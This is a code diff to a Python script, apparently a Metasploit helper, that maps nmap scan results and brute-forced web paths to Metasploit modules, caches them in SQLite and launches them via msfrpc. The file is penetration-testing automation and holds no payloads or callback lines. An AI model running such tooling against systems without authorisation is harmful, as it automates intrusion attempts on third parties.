@@ -7,16 +7,18 @@ import sys
 reload(sys)
 sys.setdefaultencoding("utf-8")
 import sqlite3
+import csv
 import datetime
 from time import gmtime, strftime
 import os, optparse, sys, subprocess
+from shutil import copyfile
 try:
  import msfrpc
 except:
  print "Please install msfrpc from https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc"
  print "\n"
  print "cd /tmp && git clone https://github.com/SpiderLabs/msfrpc"
- print "cd msfrpc && cd cd python-msfrpc && python setup.py install"
+ print "cd msfrpc && cd python-msfrpc && python setup.py install"
  print "pip install msgpack-python"
  print "\n"
  sys.exit()
@@ -67,9 +69,10 @@ mypassword=""
 portsInput=""
 intelligentMode=False
 scanAll=False
-numOfThreads=10
+numOfThreads=20
 chunkSize=50
 manualStart=False
+debugMode=False
 verbose=False
 blankDB=False
 bold=True
@@ -81,6 +84,11 @@ msfIP="127.0.0.1"
 msfPort=55552
 execMethod="all"
 nmapFilename=""
+msfCategory=""
+alrTestedModuleList=[]
+outputDirectory=os.getcwd()
+if not outputDirectory.endswith("/"):
+  outputDirectory+="/"
 
 #Dependencies
 #git clone https://github.com/SpiderLabs/msfrpc
@@ -99,6 +107,7 @@ allPathModuleList=[]
 
 uniqueSvcNameList=[]
 uniqueSvcBannerList=[]
+serviceBannerList=[]
 portsList=[]
 httpsList=[]
 httpList=[]
@@ -109,6 +118,10 @@ workingExploitList=[]
 targetList=[]
 
 catchDupSessionList=[]
+tmpOutputPathList=[]
+tmpModuleList=[]
+hostPortList=[]
+shellNoticeList=[]
 
 tmpTargetURIList=[]
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -120,6 +133,22 @@ headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 F
 			"Connection": "keep-alive"}
 
 msfPath="/usr/share/metasploit-framework"
+#msfPath="/pentest/metasploit-framework"
+
+excludePortList=[]
+#excludePortList.append(21)
+#excludePortList.append(22)
+#excludePortList.append(23)
+#excludePortList.append(25)
+#excludePortList.append(80)
+#excludePortList.append(123)
+#excludePortList.append(135)
+#excludePortList.append(139)
+#excludePortList.append(161)
+#excludePortList.append(443)
+#excludePortList.append(445)
+#excludePortList.append(3389)
+
 class colors:
   def __init__(self):
     self.green = "\033[92m"
@@ -143,6 +172,19 @@ class Logger(object):
     def flush(self):
         pass
 sys.stdout = Logger()
+
+def readMsfhelperCSV():
+  tmpCSVList=[]
+  filename="portList.csv"
+  if os.path.exists(filename):
+   with open(filename) as csv_file:
+    csv_reader = csv.reader(csv_file, delimiter=',')
+    line_count = 0
+    for row in csv_reader:
+      tmpPortNo=row[0]
+      if int(tmpPortNo) not in excludePortList:
+        tmpCSVList.append(row)
+  return tmpCSVList
 
 def generatePassword():
  chars = string.letters + string.digits
@@ -170,7 +212,7 @@ def parseNmap(filename):
  tmphttpsList=[]
  tmpportsList=[]
  tmpOSList=[]
-
+ 
  with open (filename, 'rt') as file:
   tree=ElementTree.parse(file)
  rep = NmapParser.parse_fromfile(filename)
@@ -192,11 +234,16 @@ def parseNmap(filename):
     tmpOSList.append([ip,"solaris"])
   for services in _host.services:
    if services.state=="open":
+    if [ip,services.port] not in hostPortList:
+      hostPortList.append([ip,services.port])    
     try:
      if len((services.banner).split(" ")[1])>2:
       serviceBanner=((services.banner).split(" ")[1]).lower()
       if [ip,services.port,serviceBanner] not in uniqueSvcBannerList:
        uniqueSvcBannerList.append([ip,services.port,serviceBanner])
+      tmpBanner=(services.banner).replace("product: ","")
+      if [str(services.port)+"/"+services.protocol,tmpBanner] not in serviceBannerList:
+       serviceBannerList.append([str(services.port)+"/"+services.protocol,tmpBanner])      
     except IndexError as e:
      pass
     tmpportsList.append([str(ip),str(services.port),services.protocol,services.service])
@@ -290,18 +337,24 @@ def testURL(url1):
 		#print url1
 		r = requests.get(url1, headers=headers, verify=False, timeout=5,allow_redirects=False)
 		url1=url1.strip()
-		#print url1+"\t"+str(r.status_code)
-		#html = BeautifulSoup(r.text,'html.parser')
+		#if verbose==True:
+
 		if r.status_code==200 or r.status_code==401:
+	 		print "[+] Checking: "+url1+" -  "+(setColor(str(r.status_code), bold, color="red"))
 			html = BeautifulSoup(r.text,'lxml')
 			title = html.title.string
 			pageSize = len(r.text)
 			return [url1,str(r.status_code),pageSize,str(title)[0:19]]
+	 	else:
+			print "[+] Checking: "+url1+" -  "+str(r.status_code)
+
 	except requests.exceptions.ConnectionError as e:
 		pass
 	except requests.exceptions.ReadTimeout as e:
 		pass
 	except Exception as e:
+		pass
+        except:
 		pass
 
 def testMultiURL(url,pathList):
@@ -372,100 +425,25 @@ def find_between( s, first, last ):
         return s[start:end]
     except ValueError:
         return ""
-
+   
 def runCommand(fullCmd):
     try:
         return commands.getoutput(fullCmd)
     except:
         return "Error executing command %s" %(fullCmd)
 
-def extractParam(uri,filename):
- with open(filename) as f:
-  lines = f.read().splitlines()
- moduleName = filename.replace(msfPath,"")
- startFound=False
- pathList=[]
- tempStrList=[];
- finalList=[]
- optionList=[]
- found=False
- foundName=False
- moduleTitle=""
- for line in lines:
-  if "'Name'" in line:
-   if foundName==False:
-    line1 = line.split("=>")
-    if len(line1)>1:
-     moduleTitle=(line1[1])[2:-2]
-     moduleTitle=moduleTitle.replace(","," ")
-  if "register_options" in line:
-   startFound=True
-  if "self.class" in line and found==False:
-   found1=False
-   for y in optionList:
-    if found1==True:
-     y = y.strip()
-     if "#" not in y:
-      tempStrList.append(y)
-    if ".new" in y:
-     if found1==True:
-      tempStrList=[]
-      found1=False
-     if "[" in y and "]" in y:
-      y = y.strip()
-      finalList.append(y)
-     else:
-      y = y.strip()
-      if "#" not in y:
-       tempStrList.append(y)
-       found1=True
-   startFound=False
-   found=True
-  if startFound==True:
-   optionList.append(line)
- result1=""
- for y in tempStrList:
-  try:
-   m = re.search('"(.+?)"',y)
-   temp1 = str(m.group(1)).replace(",","")
-   y = y.replace(m.group(1),temp1)
-   result1 += y
-  except AttributeError:
-   result1 += y
-   continue
- if len(str(result1))>0:
-  result1 = result1.replace(" ","")
-  finalList.append(result1)
- tempStr1=""
- for g in finalList:
-  if "false" not in g.lower() and "rhost" not in g.lower():
-   parameterList = g.partition('[')[-1].rpartition(']')[0]
-   parNameTemp =( g.split(",")[0]).partition("'")[-1].rpartition("'")[0]
-   result = (parameterList.split(",")[-1]).strip()
-   if result=='""' or result=="''":
-    tempStr1+= parNameTemp
-    tempStr1+= "+"
- moduleName = moduleName.replace(".rb","")
- if len(tempStr1)>0:
-  if tempStr1[-1]==",":
-   results = uri+","+moduleName+",["+tempStr1[0:(len(tempStr1)-1)]+"],"+moduleTitle
-   return results
-  else:
-   results = uri+","+moduleName+",["+tempStr1[0:(len(tempStr1)-1)]+"],"+moduleTitle
-   return results
- else:
-  results = uri+","+moduleName+",[],"+moduleTitle
-  return results
-
 def retrieveModuleDetails(input):
    global tmpTargetURIList
+   portNo=0
    category=input[0][0]
    module=input[0][1]
    uriPath=''
    moduleDescription=''
    moduleOptions=''
    complete=False
-   while complete==False:
+   maxTries = 3
+   currentTries=0
+   while complete==False and currentTries<maxTries:    
     try:
      import msfrpc
      msfrpc = reload(msfrpc)
@@ -474,10 +452,9 @@ def retrieveModuleDetails(input):
      opts['port']=msfPort
      opts['uri']='/api/'
      opts['ssl']=False
-
      client = msfrpc.Msfrpc(opts)
      client.login('msf', mypassword)
-     moduleDescription=(client.call('module.info',[category,module])['description']).strip()
+     moduleDescription=(client.call('module.info',[category,module])['description']).strip()    
 
      import msfrpc
      opts={}
@@ -492,11 +469,11 @@ def retrieveModuleDetails(input):
      moduleOptions=client.call('module.options',[category,module])
      complete=True
     except Exception as e:
-     print "[!] Encountered Error: Retrying in 5 seconds\n"
-     time.sleep(2)
-
+     currentTries+=1
+     continue
    moduleName=module
    if filterModuleName(moduleName)==True:
+    print "[*] [Metasploit] Fetching module: "+category+"/"+module
     if 'TARGETURI' in str(moduleOptions).upper():
      for key, value in moduleOptions.iteritems():
       if key=='TARGETURI':
@@ -507,7 +484,7 @@ def retrieveModuleDetails(input):
          uriPath=''
          tmpTargetURIList.append([uriPath,category,moduleName])
     if filterModuleName(moduleName)==True:
-     portNo=None
+     #portNo=None
      targetSingle=True
      if 'RPORT' in str(moduleOptions):
       for key, value in moduleOptions.iteritems():
@@ -515,7 +492,8 @@ def retrieveModuleDetails(input):
         try:
          portNo=value['default']
         except KeyError:
-         portNo=None
+         portNo=0
+         #portNo=None
      else:
       if 'RPORTS' in str(moduleOptions):
        for key, value in moduleOptions.iteritems():
@@ -532,7 +510,8 @@ def retrieveModuleDetails(input):
      else:
       if 'RHOST' in str(moduleOptions):
        targetSingle=True
-     if portNo!=None:
+     #if portNo!=None:
+     if portNo!=0:
        tmpOptionList=[]
        moduleOptions=client.call('module.options',[category,moduleName])
        for key, value in moduleOptions.iteritems():
@@ -557,6 +536,7 @@ def retrieveModuleDetails(input):
         return [portNo,category,moduleName,optionStr,uriPath,moduleDescription]
        else:
         return [portNo,category,moduleName,'',uriPath,moduleDescription]
+   return [portNo,category,moduleName,'',uriPath,moduleDescription]
 
 def searchModule(x):
    foundList=[]
@@ -607,6 +587,7 @@ def pullMSF():
     client.login('msf', mypassword)
     testConnection=True
    except Exception as e:
+    print e
     if 'Connection refused' in str(e):
      time.sleep(1)
     if 'Authentication failed' in str(e):
@@ -667,20 +648,6 @@ def lookupPortDB(inputPortNo,portProtocol):
  return tmpResultList
 
 
-def runExploit(rhost,category,moduleName):
-  client = MsfRpcClient(mypassword)
-  exploit=client.modules.use(category,moduleName)
-  try:
-    exploit['RHOST'] = rhost
-  except KeyError:
-    exploit['RHOSTS'] = rhost
-  try:
-    if not options.d:
-     results=exploit.execute()
-     return results['job_id']
-  except Exception as e:
-    pass
-
 def test_port(ip, port):
     try:
         s = socket.socket()
@@ -703,20 +670,185 @@ def scanSubnet(ipRange):
  for n in range(0,256):
     ip = ip_prefix + "." + str(n)
     start_thread(ip, port)
+    
+def searchAndExtractPaths():
+	tmpResultList=[]
+	tmpFileList=[]
+	for root, directories, filenames in os.walk(msfPath):
+		 for filename in filenames: 
+				 tmpFileList.append(os.path.join(root,filename))
+	for filename in tmpFileList:
+		text_file = open(filename, "r")
+		lines = text_file.readlines()
+		for x in lines:
+			if "'uri' => '/" in x:
+				x=x.strip()
+				x=(x.split("'uri' => '")[1]).strip()
+				x=x.split("'")[0]
+				tmpFilename=x
+				tmpPath=tmpFilename
+				if '")' in tmpPath:
+					tmpPath=tmpPath.split('")')[0]
+				if len(tmpPath)<3:	
+					tmpPath="/"
+				if [filename,tmpPath] not in tmpResultList:
+					if len(tmpPath)>0 and debugMode==True:
+						print "[debugA] "+tmpPath
+					tmpResultList.append([filename,tmpPath])
+			if "'uri'    => '" in x:
+				x=x.strip()
+				x=(x.split("'uri'    => '")[1]).strip()
+				x=x.replace('"','')
+				x=x.replace("'",'')
+				x=x.strip()
+				if x.endswith(","):
+					x=x[0:len(x)-1]
+				tmpFilename=x
+				tmpPath=tmpFilename
+				if '")' in tmpPath:
+					tmpPath=tmpPath.split('")')[0]
+				if [filename,tmpPath] not in tmpResultList:
+					if len(tmpPath)>0 and debugMode==True:
+						print "[debugB] "+tmpPath
+					tmpResultList.append([filename,tmpPath])
+			if " => normalize_uri(" in x:
+				x=x.strip()
+				x=(x.split("normalize_uri(")[1]).strip()
+				tmpList=x.split(",")			
+				tmpList1=[]
+				for y in tmpList:
+					y=y.strip()
+					if " + " in y:
+						y=y.split(" + ")[0]
+					if "payload_name" not in y and y.startswith("'"):	
+						y=y.replace('"','')
+						y=y.replace("'",'')
+						y=y.strip()
+						if y.endswith(")"):
+							y=y[0:len(y)-1]
+						y=y.replace(') }','')
+						if y.endswith(')}'):
+							y=y[0:len(y)-2]
+						if y.endswith(')') and '(' not in y:
+							y=y[0:len(y)-1]
+						tmpList1.append(y)
+				tmpFilename="/"+"/".join(tmpList1)
+				tmpFilename=tmpFilename.replace("//","/")
+				if tmpFilename.endswith("/"):
+					tmpFilename=tmpFilename[0:len(tmpFilename)-1]
+        			tmpFilename=tmpFilename.replace("//","/")          
+				tmpPath=tmpFilename
+				if '")' in tmpPath:
+					tmpPath=tmpPath.split('")')[0]
+				if " " in tmpPath:
+					tmpPath=tmpPath.split(" ")[0]
+				if [filename,tmpPath] not in tmpResultList:
+					if len(tmpPath)>0 and debugMode==True:
+						print "[debugC] "+tmpPath
+					tmpResultList.append([filename,tmpPath])
+			elif "'uri'    => normalize_uri(" in x:
+				x=x.strip()
+				x=x.strip()
+				x=(x.split("'uri'    => normalize_uri(")[1]).strip()
+				tmpList=x.split(",")			
+				tmpList1=[]
+				for y in tmpList:
+					y=y.strip()
+					if (y.startswith('"') or y.startswith("'")) and not "#" in y:
+						y=y[1:len(y)-1]
+						tmpList1.append(y)
+				tmpFilename="/".join(tmpList1)
+				if tmpFilename.endswith("'"):
+					tmpFilename=tmpFilename[0:len(tmpFilename)-1]
+				if tmpFilename.endswith('"'):
+					tmpFilename=tmpFilename[0:len(tmpFilename)-1]
+				if not tmpFilename.startswith("/"):
+					tmpFilename="/"+tmpFilename
+				tmpPath=tmpFilename.replace("//","/")
+				if '")' in tmpPath:
+					tmpPath=tmpPath.split('")')[0]
+				if [filename,tmpPath] not in tmpResultList:
+					if len(tmpPath)>0 and debugMode==True:
+						print "[debugD] "+tmpPath
+					tmpResultList.append([filename,tmpPath])
+	return tmpResultList
 
-def updateDB(tmpModuleList):
+def readFiles(): 
+ tmpPortList=[]
+ conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
+ conn.text_factory = str
+ cur=conn.execute("SELECT moduleType, moduleName from portList")
+ all_rows = cur.fetchall()
+ for row in all_rows:
+  moduleType=row[0]
+  moduleName=row[1]
+  if [moduleType,moduleName] not in tmpPortList:
+    tmpPortList.append([moduleType,moduleName])
+
+ conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
+ conn.text_factory = str
+ cur=conn.execute("SELECT moduleType, moduleName from pathList")
+ all_rows = cur.fetchall()
+ for row in all_rows:
+  moduleType=row[0]
+  moduleName=row[1]
+  if [moduleType,moduleName] not in tmpPortList:
+    tmpPortList.append([moduleType,moduleName])
+ return tmpPortList
+
+def readAllData(): 
+ tmpPortList=[]
+ tmpPathList=[]
+ conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
+ conn.text_factory = str
+ cur=conn.execute("SELECT portNo, moduleType, moduleName, moduleParameters from portList")
+ all_rows = cur.fetchall()
+ for row in all_rows:
+  portNo=row[0]
+  moduleType=row[1]
+  moduleName=row[2]
+  moduleParameters=row[3]
+  if [portNo,moduleType,moduleName,moduleParameters] not in tmpPortList:
+    tmpPortList.append([portNo,moduleType,moduleName,moduleParameters])
+ conn.close()
+
+ conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
+ conn.text_factory = str
+ cur=conn.execute("SELECT uriPath, moduleType, moduleName from pathList")
+ all_rows = cur.fetchall()
+ for row in all_rows:
+  uriPath=row[0]
+  moduleType=row[1]
+  moduleName=row[2]
+  if [uriPath,moduleType,moduleName] not in tmpPathList:
+    tmpPathList.append([uriPath,moduleType,moduleName])
+ conn.close()
+
+ return tmpPortList,tmpPathList
+
+def updateDB(tmpModuleList): 
+ tmpPortList=readFiles()
+ print "[*] Loaded "+str(len(tmpPortList))+" entries from msfHelper.db"
  print "[*] Updating msfHelper.db"
+ tmpModuleList1=[]
+ for x in tmpModuleList:
+  if x not in tmpPortList:
+    tmpModuleList1.append(x)
  #Update Database
  tmpPathList=[]
  p = multiprocessing.Pool(numOfThreads)
- tmpResultList = p.map(retrieveModuleDetails,itertools.izip(tmpModuleList))
+ #tmpResultList=[]
+ tmpResultList = p.map(retrieveModuleDetails,itertools.izip(tmpModuleList1))
  p.close()
  p.terminate()
 
- f1 = open('pathList.txt','w')
- f = open('portList.csv','w')
+ tmpPathList2=[]
+ tmpPathList3=[]
+
  conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
  conn.text_factory = str
+ if len(tmpResultList)>0:
+  print "[*] Writing to msfHelper.db"
  for x in tmpResultList:
   if x!=None:
    portNo=x[0]
@@ -728,24 +860,128 @@ def updateDB(tmpModuleList):
    moduleDescription=moduleDescription.replace("\n"," ")
    if uriPath not in tmpPathList:
     tmpPathList.append(uriPath)
-    if uriPath!=None and len(uriPath)>1:
-     f1.write(uriPath+"\n")
-   f.write(str(portNo)+","+moduleType+","+moduleName+","+moduleParameters+"\n")
+    if uriPath!=None and len(uriPath)>1 and uriPath.startswith("/"):
+     if uriPath.endswith("/"):
+        uriPath=uriPath[0:len(uriPath)-1]
+     if uriPath not in tmpOutputPathList:      
+      tmpOutputPathList.append(uriPath)
    try:
+    print "[*] [Database] Adding: "+moduleType+"/"+moduleName
     conn.execute("INSERT INTO portList (portNo,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (portNo,moduleType,moduleName,moduleParameters,moduleDescription,));
     conn.commit()
    except sqlite3.IntegrityError:
     continue
    if len(uriPath)>0:
     try:
-     conn.execute("INSERT INTO pathList (uriPath,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (uriPath,moduleType,moduleName,moduleParameters,moduleDescription,));
-     conn.commit()
+     if uriPath.startswith("https://"):
+	uriPath=""
+     if len(uriPath)>0 and not uriPath.startswith("/"):
+	uriPath="/"+uriPath
+     if len(uriPath)>1 and debugMode==True:
+       print "[debugE] "+tmpPath
+     if [uriPath,moduleType,moduleName] not in tmpPathList2:
+       print "[*] [Database] Adding: "+moduleType+"/"+moduleName
+       conn.execute("INSERT INTO pathList (uriPath,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (uriPath,moduleType,moduleName,moduleParameters,moduleDescription,));
+       conn.commit()
+       tmpPathList2.append([uriPath,moduleType,moduleName])
     except sqlite3.IntegrityError:
      continue
-   print "[*] Adding: "+moduleName
- conn.close()
+
+ f = open(outputDirectory+'portList.csv','w')
+ tmpPortList1,tmpPathList1=readAllData()
+
+ for x in tmpPortList1:
+  if x[0]!="0":
+   f.write(x[0]+","+x[1]+","+x[2]+","+x[3]+"\n")
  f.close()
+ #tmpPathList=searchAndExtractPaths()
+ f1 = open(outputDirectory+'pathList.txt','w')   
+ for x in tmpPathList1:
+  if len(x[0])>1 and x[0] not in tmpPathList3:
+   f1.write(x[0]+"\n")
+   tmpPathList3.append(x[0])
  f1.close()
+
+ '''
+ conn = sqlite3.connect(os.getcwd()+"/msfHelper.db")
+ conn.text_factory = str
+ if len(tmpResultList)>0:
+  print "[*] Writing to msfHelper.db"
+ for x in tmpResultList:
+  if x!=None:
+   portNo=x[0]
+   moduleType=x[1]
+   moduleName=x[2]
+   moduleParameters=x[3]
+   uriPath=x[4]
+   moduleDescription=x[5]
+   moduleDescription=moduleDescription.replace("\n"," ")
+   if uriPath not in tmpPathList:
+    tmpPathList.append(uriPath)
+    if uriPath!=None and len(uriPath)>1 and uriPath.startswith("/"):
+     if uriPath.endswith("/"):
+        uriPath=uriPath[0:len(uriPath)-1]
+     if uriPath not in tmpOutputPathList:      
+      tmpOutputPathList.append(uriPath)
+   try:
+    print "[*] [Database] Adding: "+moduleType+"/"+moduleName
+    conn.execute("INSERT INTO portList (portNo,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (portNo,moduleType,moduleName,moduleParameters,moduleDescription,));
+    conn.commit()
+   except sqlite3.IntegrityError:
+    continue
+   if len(uriPath)>0:
+    try:
+     if uriPath.startswith("https://"):
+	uriPath=""
+     if len(uriPath)>0 and not uriPath.startswith("/"):
+	uriPath="/"+uriPath
+     if len(uriPath)>1 and debugMode==True:
+       print "[debugE] "+tmpPath
+     if [uriPath,moduleType,moduleName] not in tmpPathList2:
+       print "[*] [Database] Adding: "+moduleType+"/"+moduleName
+       conn.execute("INSERT INTO pathList (uriPath,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (uriPath,moduleType,moduleName,moduleParameters,moduleDescription,));
+       conn.commit()
+       tmpPathList2.append([uriPath,moduleType,moduleName])
+    except sqlite3.IntegrityError:
+     continue
+ '''
+ f1 = open(outputDirectory+'pathList.txt','a+')   
+ tmpPathList=searchAndExtractPaths()
+ for x in tmpPathList:
+  x[0]=x[0].replace(msfPath,"")
+  x[0]=x[0].replace("/modules/","")
+  tmpPath=x[1]
+  x1=x[0].split("/")  
+  tmpModuleType=x1[0]
+  tmpModuleName=x[0].replace(x1[0],"")
+  tmpModuleName=tmpModuleName[1:len(tmpModuleName)-3]
+  tmpModuleDescription=""
+  if len(tmpPath)>0:
+    try:
+     if [tmpPath,tmpModuleType,tmpModuleName] not in tmpPathList2:
+      if tmpPath not in tmpPathList3:
+       f1.write(tmpPath+"\n")
+       tmpPathList3.append(tmpPath)       
+      if [tmpPath,tmpModuleType,tmpModuleName,"",tmpModuleDescription] not in allPathModuleList:
+        conn.execute("INSERT INTO pathList (uriPath,moduleType,moduleName,moduleParameters,moduleDescription) VALUES  (?,?,?,?,?)" , (tmpPath,tmpModuleType,tmpModuleName,"",tmpModuleDescription,));
+        print "[*] [Database] Adding: "+tmpModuleType+"/"+tmpModuleName+" ["+tmpPath+"]"
+      tmpPathList2.append([tmpPath,tmpModuleType,tmpModuleName])
+     if len(x[1])>1: 
+      if x[1] not in tmpOutputPathList:      
+       #f1.write(x[1]+"\n")
+       tmpOutputPathList.append(x[1])
+
+     conn.commit()
+    except sqlite3.IntegrityError as e:
+     print e
+     continue
+ f1.close()
+
+ #f.close()
+ #f1.close()
+ conn.close()
+ if os.getcwd()+"/"!=outputDirectory:
+  copyfile(os.getcwd()+"/msfHelper.db", outputDirectory+"msfHelper.db")
 
 def diff(list1, list2):
     c = set(list1).union(set(list2))
@@ -822,8 +1058,7 @@ def runExploitDBModules():
 def runWebBasedModules():
 	if execMethod=="all" or execMethod=="web":
 	 vulnURLList=[]
-	 message="\n**** Finding MSF Modules - Bruteforcing URI Paths ****"
-	 print(setColor(message, bold, color="red"))
+         print "\n"+(setColor("[Bruteforcing URI Paths]]", bold, color="red"))
          if len(httpList)>0:
           tmpHttpList=[]
 	  for x in httpList:
@@ -875,8 +1110,9 @@ def runWebBasedModules():
 
 	 if len(tmpPathResultList)>0:
 	  #Run all modules against web servers which uripath matches against the list
- 	  print "\n**** Test Results from Metasploit Modules ****"
-          print "Please wait ..."
+          if showOnly==False:
+  	   print "\n"+(setColor("[Results from Metasploit]", bold, color="red"))
+       #print "\n**** Test Results from Metasploit Modules ****"
 	  #message="\n[*] Launching compatible Metasploit modules"
 	  #print(setColor(message, bold, color="red"))
 	  tmpPathResultList1=[]
@@ -929,8 +1165,10 @@ def runWebBasedModules():
 	   message="\n**** Finding MSF Modules which TARGETURI is set to / *****"
 	   #message="\n[*] Running other Metasploit modules whose parameter  TARGETURI is set to /"
            print(setColor(message, bold, color="red"))
- 	   print "**** Test Results from Metasploit Modules ****"
-           print "Please wait ..."
+           if showOnly==False:
+            print "\n"+(setColor("[Results from Metasploit]", bold, color="red"))
+            #print "**** Test Results from Metasploit Modules ****"
+           #print "Please wait ..."
 	   runMsfExploitsAndDisplayreport(tmpPathResultList1)
 
 	  tmpPathResultList3=[]
@@ -978,23 +1216,18 @@ def runServiceBasedModules():
 	    tmpKeywordList.append(z)
 
 	 if len(tmpResultList)>0:
- 	  #for z in tmpResultList:
  	  for z in tmpKeywordList:
 	   title=z[0]
 	   moduleList=z[1]
            if title!="http" and title!="ssl/http" and len(title)>2:
-            if count>0:
-             print "\n"
-     	    print "Finding Modules Based on Keyword: "+title
             count+=1
-	    if len(moduleList)<1:
-	     print "No results found"
     	    if len(moduleList)>0:
+             print "\n"+(setColor("[Finding Modules Based on Keyword: "+title+"]", bold, color="red"))
              if intelligentMode==True:
                #if len(moduleList)>0:
                tmpModuleList1=[]
                for a in moduleList:
-                if intelligentMode==True:
+                 #if intelligentMode==True:
                  if "windows" not in a[1] and "linux" not in a[1] and "unix" not in a[1] and "osx" not in a[1] and "solaris" not in a[1]:
                   if [a[0],a[1],a[2],a[4]] not in tmpModuleList1:
                    tmpModuleList1.append([a[0],a[1],a[2],a[4]])
@@ -1004,12 +1237,11 @@ def runServiceBasedModules():
                    if osType in a[1]:
                     if [a[0],a[1],a[2],a[4]] not in tmpModuleList1:
                      tmpModuleList1.append([a[0],a[1],a[2],a[4]])
-                else:
-                 #tmpModuleList1.append([a[0],a[1],a[2],a[3],a[4]])
-                 if [a[0],a[1],a[2],a[4]] not in tmpModuleList1:
-                  tmpModuleList1.append([a[0],a[1],a[2],a[4]])
+                 #else:
+                 #if [a[0],a[1],a[2],a[4]] not in tmpModuleList1:
+                 # tmpModuleList1.append([a[0],a[1],a[2],a[4]])
                if len(tmpModuleList1)>0:
-       	        print tabulate(tmpModuleList1, headers=["Type","Metasploit Module","Port No","Parameters"])
+       	        print tabulate(tmpModuleList1, headers=["Type","Metasploit Module","Port No","Parameters"],tablefmt="orgtbl")
                else:
 		print "No results found"
               #else:
@@ -1017,9 +1249,10 @@ def runServiceBasedModules():
              else:
               tmpModuleList1=[]
               for y in moduleList:
-               tmpModuleList1.append([y[0],y[1],y[2],y[3]])
+               if [y[0],y[1],y[2],y[3]] not in tmpModuleList1:
+                tmpModuleList1.append([y[0],y[1],y[2],y[3]])
               if len(tmpModuleList1)>0:
-    	       print tabulate(tmpModuleList1, headers=["Type","Metasploit Module","Port No","Parameters"])
+    	       print tabulate(tmpModuleList1, headers=["Type","Metasploit Module","Port No","Parameters"],tablefmt="orgtbl")
               else:
                print "No results found"
 	     for y in moduleList:
@@ -1060,8 +1293,8 @@ def runServiceBasedModules():
 	 tmpList1=[]
 
  	 if len(autoExpListExp)>0 or len(autoExpListAux)>0:
-          print "\n**** Test Results from Metasploit Modules ****"
-          print "Please wait ..."
+          if showOnly==False:
+           print "\n"+(setColor("[Results from Metasploit]", bold, color="red"))
  	 if len(autoExpListExp)>0 and showOnly==False:
 	  for x in autoExpListExp:
 	   hostNo=x[0]
@@ -1092,20 +1325,19 @@ def runServiceBasedModules():
                startCount+=1
               else:
                startCount=0
-
  	 if len(tmpList1)>0:
  	  runMultipleAuxExploits(tmpList1)
 
 	if execMethod=="all" or execMethod=="services":
  	 if len(manualExpList):
 	  tmpList=[]
-	  print "\n**** List of Modules to Run Manually ****"
           if intelligentMode==True:
  	   for x in manualExpList:
             if "windows" not in x[3] and "linux" not in x[3] and "unix" not in x[3] and "osx" not in x[3] and "solaris" not in x[3]:
              if [x[0]+":"+x[1],x[2]+"/"+x[3],x[4]] not in tmpList:
     	       tmpList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
-	       runManualList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
+	       if [x[0]+":"+x[1],x[2]+"/"+x[3],x[4]] not in runManualList:
+	        runManualList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
             else:
              for y in osList:
               osType=y[1]
@@ -1113,17 +1345,17 @@ def runServiceBasedModules():
                if [x[0]+":"+x[1],x[2]+"/"+x[3],x[4]] not in tmpList:
      	        tmpList.append([x[0]+":"+x[1],x[2]+"/"+x[3],x[4]])
            if len(tmpList)>0:
+	    print "\n"+(setColor("[List of Modules to Run Manually]", bold, color="red"))
             print tabulate(tmpList)
            else:
             print "No results found"
          else:
            if len(manualExpList)>0:
             print tabulate(manualExpList, headers=["Host","Metasploit Module","Parameters"])
-           #else:
-           # print "No results found"
 
 
 def runPortBasedModules():
+        global excludePortList
 	if execMethod=="all" or execMethod=="ports":
  	 message = "\n**** Finding MSF Modules based on Service Name ****"
 	 autoExpListAux=[]
@@ -1158,11 +1390,13 @@ def runPortBasedModules():
                 if moduleType=='exploit':
                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
 		  found=True
-                  autoExpListExp.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
+                  if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in autoExpListExp:
+                   autoExpListExp.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
                else:
                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in manualExpList:
 		 found=True
-                 manualExpList.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
+                 if [hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription] not in manualExpList:
+                  manualExpList.append([hostNo,portNo,moduleType,moduleName,moduleParameters,moduleDescription])
               else:
                #if unable to find keyword match in intelligentMode, add to tmpList, if no match at all then run all modules based on port no
                if tmpSvcBanner in moduleDescription:
@@ -1224,9 +1458,11 @@ def runPortBasedModules():
             for y in tmpmanualExpList:
 	     manualExpList.append(y)
             for y in tmpautoExpListExp:
-	     autoExpListExp.append(y)
+	     if y not in autoExpListExp:
+ 	      autoExpListExp.append(y)
             for y in tmpautoExpListAux:
-	     autoExpListAux.append(y)
+	     if y not in autoExpListAux:
+ 	       autoExpListAux.append(y)
   	    tmpautoExpListAux=[]
 	    tmpautoExpListExp=[]
 	    tmpmanualExpList=[]
@@ -1234,8 +1470,47 @@ def runPortBasedModules():
          if len(manualExpList)<1 and len(autoExpListAux)<1 and len(autoExpListExp)<1:
  	  print "No Metasploit modules found matching criteria"
 
+
 	 message = "\n**** Finding MSF Modules based on Port No ****"
-	 print(setColor(message, bold, color="red"))
+         tmpDict1={}
+  	 if len(uniqueSvcBannerList)>0:
+    	  print "\n"+(setColor("[List of Unique Service Banners]", bold, color="red"))
+
+   	  tmpserviceBannerList=[]
+   	  for x in serviceBannerList:
+    	   if len(x[1])>0:
+     	    tmpserviceBannerList.append([x[0],x[1]])
